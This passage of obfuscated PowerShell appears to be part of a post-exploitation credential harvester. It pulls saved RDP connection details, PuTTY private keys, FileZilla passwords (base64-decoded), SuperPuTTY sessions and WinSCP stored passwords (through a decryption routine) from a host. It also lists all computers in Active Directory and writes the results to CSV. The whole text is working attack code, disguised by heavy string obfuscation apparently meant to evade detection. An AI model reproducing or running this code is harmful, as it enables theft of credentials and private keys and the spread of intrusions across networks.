      ${rD`PFilE`OB`JeCt}."Administrative Session" = ("{11}{13}{9}{3}{4}{1}{8}{6}{7}{10}{0}{5}{12}{2}"-f'n','to admin ','ost',' connec','t ',' ','s','sio','se',' not','n o','Do','remote h','es')
    } else {
      ${r`dpfIlEO`BJ`Ect}."Administrative Session" = ("{0}{3}{2}{6}{4}{5}{1}" -f'Connec','ost','to','ts ',' ','on remote h',' admin session')
    }
    if (!${Rd`pfILEob`j`ecT}."Prompts for Credentials" -or ${RDpfi`leOBjE`CT}."Prompts for Credentials" -eq 0) {
      ${rdp`FILe`ob`J`ECt}."Prompts for Credentials" = "No"
    } else {
      ${RDPFi`LeoB`J`EcT}."Prompts for Credentials" = "Yes"
    }

    [void]${ARrA`yoFRdPF`il`eS}.("{1}{0}" -f 'dd','A').Invoke(${rdpFi`LeO`B`jeCt})

  }

  if (${Arr`A`y`OF`RdpFIles}."c`OUnt" -gt 0) {

    ${use`ROb`jeCt} | &("{2}{0}{1}"-f'-Me','mber','Add') -MemberType ("{0}{2}{1}{3}"-f'No','roper','teP','ty') -Name ("{1}{0}{2}" -f'P File','RD','s') -Value ${ArRayo`F`RD`pFIL`eS}

    if (${O}) {
      ${aR`R`Ayo`FrDP`FILEs} | &("{3}{0}{2}{1}{4}" -f 'lec','O','t-','Se','bject') ('*') | &("{0}{1}{3}{2}" -f'E','xport','CSV','-') -Append -Path (${oUTPU`TDI`Re`CtOrY} + ((("{8}{5}{0}{2}{4}{6}{7}{3}{1}" -f'M','.csv','icr','es','os','M','o','ft rdp Fil','GK'))  -replaCe  'GKM',[CHar]92)) -NoTypeInformation
    } else {
      &("{2}{0}{1}" -f 'te-Out','put','Wri') (("{4}{9}{0}{2}{8}{3}{7}{5}{6}{1}"-f 'ft','dp)',' R','nnect','Mi','s ','(.r','ion File','DP Co','croso'))
      ${A`RRaYo`FR`dp`F`IlES} | &("{2}{1}{0}"-f 'ct','lect-Obje','Se') ('*') | &("{0}{2}{1}"-f'F','mat-List','or') | &("{0}{3}{1}{2}" -f'Out-','tr','ing','S')
    }

  }

} 

function pROc`Es`SpP`kFi`le(${p`P`KE`xt`EnSIonFIl`esi`NOdeS}) {

  
  foreach (${PA`TH} in ${PPK`E`x`TE`NSiOnfiLE`sinOdeS}."vErSi`oNI`NFO"."fi`LENAme") {

    
    ${Pp`k`FI`LEo`BJEct} = "" | &("{2}{1}{3}{0}"-f 't','j','Select-Ob','ec') -Property ("{1}{0}" -f'urce','So'),("{1}{0}" -f 'ath','P'),("{2}{0}{1}"-f 'o','l','Protoc'),("{0}{2}{1}"-f 'Com','nt','me'),("{1}{3}{4}{2}{0}"-f 'tion','Private','cryp',' Ke','y En'),("{0}{2}{1}" -f'Pr','e Key','ivat'),("{3}{1}{0}{2}"-f'va','ri','te MAC','P')

    ${ppkf`I`lE`OBJeCt}."Source" = (&("{0}{1}" -f'Hos','tname'))

    
    ${p`Pk`F`Ile`obJEct}."Path" = ${PA`TH}

    ${pPKfIlEO`B`JEct}."Protocol" = try { (&("{2}{3}{0}{1}" -f'S','tring','Se','lect-') -Path ${Pa`Th} -Pattern ("{0}{1}"-f': (','.*)') -Context 0,0)."match`ES"."GroU`Ps"[1]."vAl`Ue" } catch {}
    ${p`PK`FILEO`BjEcT}."Private Key Encryption" = try { (&("{2}{0}{3}{1}"-f'c','-String','Sele','t') -Path ${pa`TH} -Pattern ("{0}{3}{2}{1}"-f'Encry',' (.*)','tion:','p'))."MatCh`es"."groU`Ps"[1]."va`lUe" } catch {}
    ${p`pkFilEobj`Ect}."Comment" = try { (&("{2}{0}{1}{3}"-f '-','Stri','Select','ng') -Path ${p`ATh} -Pattern (("{0}{3}{2}{4}{1}"-f'Co',')','(.','mment: ','*')))."Ma`TCHEs"."Gro`Ups"[1]."VaL`Ue" } catch {}
    ${N`UmbeROFP`RiVA`TEK`e`Y`linEs} = try { (&("{3}{0}{2}{1}"-f 'elec','String','t-','S') -Path ${Pa`TH} -Pattern ("{2}{0}{1}{3}"-f' (','.','Private-Lines:','*)'))."MAtc`HES"."gR`ou`pS"[1]."vA`lUe" } catch {}
    ${P`PK`FileObJ`EcT}."Private Key" = try { (&("{0}{4}{2}{3}{1}" -f'Select','g','i','n','-Str') -Path ${p`ATH} -Pattern (("{0}{1}{5}{4}{3}{2}" -f'Pr','i','*)','nes: (.','i','vate-L')) -Context 0,${n`UMB`erOF`PrivaTE`keYLINEs})."C`ON`TEXt"."Pos`TcOnt`eXT" -Join "" } catch {}
    ${p`Pk`F`IlEoBJECt}."Private MAC" = try { (&("{4}{0}{3}{1}{2}"-f'lect-','trin','g','S','Se') -Path ${PA`Th} -Pattern (("{4}{1}{3}{2}{0}" -f '*)','MAC:','(.',' ','Private-')))."m`AtcHes"."G`Rou`pS"[1]."vA`lue" } catch {}

    
    [void]${A`RrAYOF`pP`kFiLEs}.("{0}{1}"-f 'A','dd').Invoke(${PPkF`ilEo`BJ`e`cT})

  }

  if (${A`RRA`YoFp`pk`FILeS}."CO`UNt" -gt 0) {

    ${Us`eR`ObJe`CT} | &("{0}{2}{1}" -f 'Add-Mem','r','be') -MemberType ("{0}{2}{1}{3}" -f'No','Prop','te','erty') -Name ("{2}{0}{1}"-f'e','s','PPK Fil') -Value ${a`RRA`Yo`F`PpkFilEs}

    if (${o}) {
      ${aRrAyOF`PP`Kfi`lEs} | &("{1}{0}{2}"-f'O','Select-','bject') ('*') | &("{2}{0}{1}"-f'p','ort-CSV','Ex') -Append -Path (${Ou`TPuTdI`R`Ec`Tory} + ((("{3}{1}{0}{2}"-f'TY ppk Files','6PuT','.csv','Wb'))-REplAcE ([cHaR]87+[cHaR]98+[cHaR]54),[cHaR]92)) -NoTypeInformation
    } else {
      &("{2}{0}{1}{3}" -f'rite-','Outp','W','ut') ("{3}{0}{4}{1}{2}{5}"-f 'uTTY Pri','ate Ke','y Files (.ppk','P','v',')')
      ${arr`AYOF`PPkfI`LES} | &("{1}{0}{3}{4}{2}" -f 'c','Sele','ject','t-','Ob') ('*') | &("{2}{0}{1}" -f'at-Lis','t','Form') | &("{0}{2}{1}" -f'O','ng','ut-Stri')
    }

  }

} 

function PRo`ceSs`FILE`Z`I`LlafILE(${F`ilEzI`lLaX`Ml}) {

  
  foreach(${FiLe`ZIll`A`seSsioN} in ${FIle`zI`ll`AxmL}.("{1}{2}{3}{0}"-f'des','Sel','ect','No').Invoke(("{6}{5}{3}{2}{4}{7}{0}{1}"-f'rs/Ser','ver','Se','la3/','r','eZil','//Fil','ve'))) {
      
      ${f`IL`E`z`ILLASesSIoNhash} = @{}

      
      ${FI`lEZ`i`llasE`Ssion}."CHiLD`NOD`es" | &("{0}{1}{2}"-f'For','Each-Ob','ject') {

          ${FilE`ZIL`LAS`ESsIOnhaSH}[("{1}{0}{2}"-f 'o','S','urce')] = ${SOU`Rce}
          
          if (${_}."I`NnErtE`xt") {
              if (${_}."N`AME" -eq ("{0}{1}" -f'Pas','s')) {
                  ${Fi`LezillaS`eSSi`oNh`AsH}[("{2}{0}{1}"-f'asswo','rd','P')] = ${_}."in`NeRTE`xt"
              } else {
                  
                  ${fIL`eZIl`lASEss`IoN`H`A`Sh}[${_}."nA`ME"] = ${_}."InNe`RT`exT"
              }
              
          }

      }

    
    [void]${aR`Ra`yOFfILeZ`iL`l`ASeSS`ioNS}.("{0}{1}" -f 'A','dd').Invoke((&("{1}{2}{0}"-f 'ct','Ne','w-Obje') ("{1}{2}{0}" -f'ct','PSO','bje') -Property ${Fi`l`EziLla`sES`siON`hAsh} | &("{0}{3}{1}{2}" -f 'S','ect-O','bject','el') -Property ('*') -ExcludeProperty ("{1}{0}"-f'ext','#t'),("{0}{1}{2}{3}" -f 'L','o','go','nType'),("{1}{0}" -f 'e','Typ'),("{1}{0}{2}{3}"-f'ssP','Bypa','r','oxy'),("{1}{0}{3}{2}"-f 'cBro','Syn','ing','ws'),("{0}{2}{1}" -f'Pasv','ode','M'),("{0}{2}{4}{3}{1}" -f'D','ison','irect','yCompar','or'),("{8}{0}{6}{1}{2}{7}{5}{3}{4}"-f 'ximumMult','e','Conn','tio','ns','c','ipl','e','Ma'),("{0}{1}{2}"-f 'Encodi','ngTyp','e'),("{0}{2}{1}"-f'Timezo','et','neOffs'),("{0}{1}"-f'Colou','r')))
     
  } 
  
  
  foreach (${SESs`i`oN} in ${aRrA`yOffIlEzI`l`laS`eSsiONS}) {
      ${Se`SsIon}."P`ASsWo`RD" =   $1Ef::"As`CII"."GETST`RI`NG"(  $WfSx02::("{0}{1}{3}{2}" -f'From','Bas','g','e64Strin').Invoke(${s`EsS`IoN}."pASSwo`RD"))
      if (${sE`SS`ION}."PROTO`Col" -eq "0") {
        ${S`Ess`ion}."prOT`o`Col" = ("{3}{7}{2}{1}{6}{4}{5}{0}"-f'able','ov',' ','Use','r TLS ','if avail','e',' FTP')
      } elseif (${SE`ss`ioN}."P`Rot`OCOL" -eq 1) {
        ${S`eS`SIoN}."Prot`O`coL" = ("{0}{1}"-f 'Use SFT','P')
      } elseif (${seS`S`ioN}."p`Ro`TOcOl" -eq 3) {
        ${SE`sSi`On}."pr`otocol" = ("{5}{6}{7}{1}{3}{2}{4}{0}"-f' TLS','e','ov',' implicit FTP ','er','R','equi','r')
      } elseif (${se`SsI`On}."Pr`o`TocOl" -eq 4) {
        ${SE`ssIOn}."prO`T`OcOL" = ("{3}{0}{7}{1}{4}{2}{6}{5}" -f 'uire explici','T','v','Req','P o','LS','er T','t F')
      } elseif (${seS`sIon}."pR`OTO`Col" -eq 6) {
        ${S`EsS`Ion}."p`R`otoCoL" = ("{5}{1}{8}{2}{0}{7}{4}{3}{6}"-f ' F','u','e plain','s','P (in','Only ','ecure)','T','s')
      } 
  }

  if (${o}) {
    ${arRA`Y`OfF`Il`eZilLaSEss`IOnS} | &("{2}{0}{1}" -f '-','CSV','Export') -Append -Path (${oUT`pUtDi`R`eCtoRy} + ((("{2}{3}{0}{1}"-f 'leZi','lla.csv','ZfPF','i')) -crEpLaCe  ([CHAr]90+[CHAr]102+[CHAr]80),[CHAr]92)) -NoTypeInformation
  } else {
    &("{0}{1}{2}{3}"-f'W','ri','te-Outpu','t') ("{2}{3}{1}{4}{0}" -f's','lla Se','File','Zi','ssion')
    ${ARRa`YOFFI`L`ezIL`la`sE`SSIonS} | &("{2}{0}{1}{3}"-f 'orma','t-Li','F','st') | &("{1}{0}{2}"-f 't-S','Ou','tring')
  }

  
  ${usERO`B`jEct} | &("{1}{2}{0}"-f 'mber','Add-','Me') -MemberType ("{1}{2}{3}{0}" -f'erty','Not','ePr','op') -Name ("{4}{1}{3}{0}{2}" -f'ion','ileZilla','s',' Sess','F') -Value ${arrAy`of`FiL`EzilLA`sESSions}

} 

function PR`o`CEs`ssUPeRP`U`TtyfIlE(${s`UpEr`pUt`Ty`xMl}) {

  foreach(${su`pErPuTTyS`eS`SiOns} in ${S`Up`er`pu`TtYxMl}."ArrayOFSE`SsI`OnDA`TA"."SEs`sI`ON`dATA") {

    foreach (${SUpErPUtt`yS`eS`SIon} in ${suPeR`pUttYS`ESs`ioNS}) { 
      if (${S`UPErpUTTY`SESsI`ON} -ne ${NU`ll}) {

        ${sUpEr`p`UT`TySeSSioNOBJ`ECT} = "" | &("{3}{2}{1}{0}"-f 't','c','ct-Obje','Sele') -Property ("{0}{2}{1}"-f'S','e','ourc'),("{0}{2}{1}" -f'Ses','ionId','s'),("{0}{1}{2}" -f'Se','ssion','Name'),("{1}{0}"-f 'st','Ho'),("{1}{2}{0}"-f 'rname','U','se'),("{0}{1}{2}"-f'Ext','raA','rgs'),("{1}{0}"-f'rt','Po'),("{2}{0}{1}" -f 'tty Sessio','n','Pu')

        ${sUPeR`PU`T`TyseSS`iOnO`BjEct}."Source" = ${s`o`URCE}
        ${sU`pERpU`TtyS`eS`S`io`NoBjeCt}."SessionId" = ${s`U`Per`PUtt`Y`SEssION}."sE`ssiON`ID"
        ${sup`ERpU`TtySE`SsI`on`obJ`eCT}."SessionName" = ${SU`Per`PU`TtYS`esSiON}."seS`SIoNn`AME"
        ${SuP`ERPUT`TY`SES`Sio`NO`BJEct}."Host" = ${supeRpUTt`Ys`Es`S`I`ON}."H`oST"
        ${SU`PeRp`Ut`TY`S`EssIoNoBjECT}."Username" = ${SupERputTY`Se`S`S`i`On}."uSE`Rn`AmE"
        ${SupeRp`U`T`T`Ys`ESSiONobJ`ECT}."ExtraArgs" = ${sUPE`R`pu`TtY`SeS`sIon}."e`XTRaar`Gs"
        ${su`pERp`U`TTYse`ss`ion`ObjEcT}."Port" = ${su`perPUTTY`se`ss`I`on}."PO`RT"
        ${sUPeRpU`T`TYS`eSS`IONO`BJEcT}."PuTTY Session" = ${SUPERPUtT`Y`sEs`sION}."put`T`YSE`Ssion"

        [void]${aR`RaY`OfsUperP`UTTys`esSIoNS}.("{1}{0}"-f 'd','Ad').Invoke(${S`UP`erpuTTYS`EssI`o`NOBje`Ct})
      } 
    }

  } 

  if (${o}) {
    ${ARRAYOFs`Uperp`UT`TYsesSIO`Ns} | &("{2}{1}{0}"-f'V','t-CS','Expor') -Append -Path (${OuTpU`Td`Ir`EctORY} + ((("{3}{0}{2}{1}" -f 'er','Y.csv','PuTT','{0}Sup')) -F[ChAR]92)) -NoTypeInformation
  } else {
    &("{0}{2}{1}"-f'Writ','put','e-Out') ("{1}{0}{3}{2}"-f 'uperP','S','sions','uTTY Ses')
    ${ar`RAYofS`UPe`Rputt`ySe`ssionS} | &("{2}{1}{0}" -f'ng','ri','Out-St')
  }

  
  ${USErO`BJ`ect} | &("{1}{0}{2}"-f'dd-Membe','A','r') -MemberType ("{0}{3}{1}{2}" -f'Not','r','operty','eP') -Name ("{1}{5}{2}{0}{4}{3}" -f 'Y ','Sup','PuTT','ons','Sessi','er') -Value ${a`RRay`ofSuPeRpuTtYS`esSi`o`NS}

} 








function GeTc`OmpuT`ersfro`M`AcTIv`Ed`i`REC`ToRY {

  ${S`T`R`cATEgoRY} = ("{0}{1}{2}" -f 'c','om','puter')
  ${ObjDO`m`AIn} = &("{2}{1}{0}"-f 'ct','Obje','New-') ("{5}{4}{2}{7}{0}{3}{1}{6}" -f'.D','ryEnt','S','irecto','y','System.Director','ry','ervices')
  ${Ob`jSeArcH`Er} = &("{0}{1}{2}"-f'New','-Ob','ject') ("{5}{0}{4}{1}{6}{3}{2}"-f'stem.Dir','t','es.DirectorySearcher','rvic','ec','Sy','orySe')
  ${ObJ`SEAr`ch`eR}."se`ARcH`ROoT" = ${ob`jd`omaIN}
  ${obj`s`eA`RChEr}."fI`LTeR" = ("(objectCategory=$strCategory)")

  ${c`o`lpRopList} = ("{1}{0}"-f 'e','nam')

  foreach (${i} in ${Col`pR`OP`LIsT}){${OBJse`AR`Cher}."PROper`TIEStO`LOaD".("{1}{0}"-f 'dd','A').Invoke(${i})}

  return ${oBJ`seArch`Er}.("{1}{0}" -f'indAll','F').Invoke()

}

function Decr`Y`p`TneXtCHaRaCtER`WINS`CP(${re`M`A`iningpAsS}) {

  
  ${fla`GanDp`A`ss} = "" | &("{3}{2}{0}{4}{1}"-f'ct-Obj','ct','e','Sel','e') -Property ("{0}{1}"-f 'fla','g'),("{1}{2}{3}{0}"-f'iningPass','r','e','ma')

  
  ${F`Ir`stvAL} = (("{0}{3}{4}{1}{2}" -f '0','9ABCD','EF','123','45678')."Ind`eX`Of"(${R`eMaIninGp`ASS}[0]) * 16)
  ${S`ECOND`VAl} = ("{3}{1}{0}{2}{4}" -f'6789','5','ABCDE','01234','F')."InDex`oF"(${REmAi`Ning`Pa`sS}[1])

  ${A`Dd`eD} = ${fi`RSt`VAL} + ${SEC`oN`Dval}

  ${D`E`CrypteD`RES`ULt} = (((-bnot (${aD`deD} -bxor ${m`Agic})) % 256) + 256) % 256

  ${F`lA`G`ANDpAss}."fL`AG" = ${deC`RYPTeDR`E`SuLt}
  ${F`L`Agan`dpAss}."REMaI`NIngp`A`ss" = ${rem`AINin`g`p`ASs}.("{0}{2}{1}" -f 'S','g','ubstrin').Invoke(2)

  return ${F`l`A`gANdpaSs}

}

function DecrYPT`w`InscpPas`SwORD(${sEssioNh`O`STN`Ame}, ${S`eSs`i`onus`ErNAME}, ${PASsW`o`RD}) {

  ${cHeCK`F`laG} = 255
  ${M`A`gIc} = 163

  ${l`eN} = 0
  ${k`EY} =  ${s`ess`IONh`OSTnAMe} + ${S`ESSioNUSErna`me}
  ${va`LU`ES} = &("{3}{2}{4}{1}{0}" -f 'inSCP','acterW','c','De','ryptNextChar')(${P`As`SwoRd})

  ${stor`EDFl`Ag} = ${v`AlUEs}."F`laG" 

  if (${v`Al`UeS}."f`LaG" -eq ${c`He`CKfl`AG}) {
    ${va`L`UES}."rEM`AI`NInGPaSS" = ${V`AluES}."re`m`AiNIngPA`sS".("{0}{1}{2}"-f 'Sub','st','ring').Invoke(2)
    ${v`AL`Ues} = &("{0}{2}{5}{4}{3}{1}" -f 'Decry','SCP','ptNext','in','racterW','Cha')(${V`A`lUeS}."rEmAi`N`iNgpaSS")
  }

  ${l`EN} = ${V`Al`UEs}."Fl`AG"

  ${v`A`luEs} = &("{4}{0}{5}{1}{3}{2}" -f'tCharac','WinS','P','C','DecryptNex','ter')(${ValU`es}."RemAiNi`N`GP`AsS")
  ${v`ALU`eS}."r`emAinINgp`A`SS" = ${Va`L`UeS}."r`EmaIn`iNg`PasS".("{1}{2}{0}"-f'ring','Sub','st').Invoke((${VA`LuEs}."f`laG" * 2))

  ${FInALo`Ut`pUT} = ""
  for (${i}=0; ${I} -lt ${l`en}; ${I}++) {
    ${v`A`luES} = (&("{3}{2}{5}{1}{4}{0}{6}" -f 'erWin','NextCh','cry','De','aract','pt','SCP')(${VA`L`UeS}."r`EmA`Ini`NgpasS"))
    ${FIN`AL`ouTp`UT} += [char]${valu`eS}."F`laG"
  }

  if (${sToreD`Fl`Ag} -eq ${c`heC`kfLAG}) {
    return ${FInaL`OU`T`puT}.("{1}{0}"-f 'bstring','Su').Invoke(${k`EY}."l`e`Ngth")
  }

  return ${finalO`U`Tp`UT}

}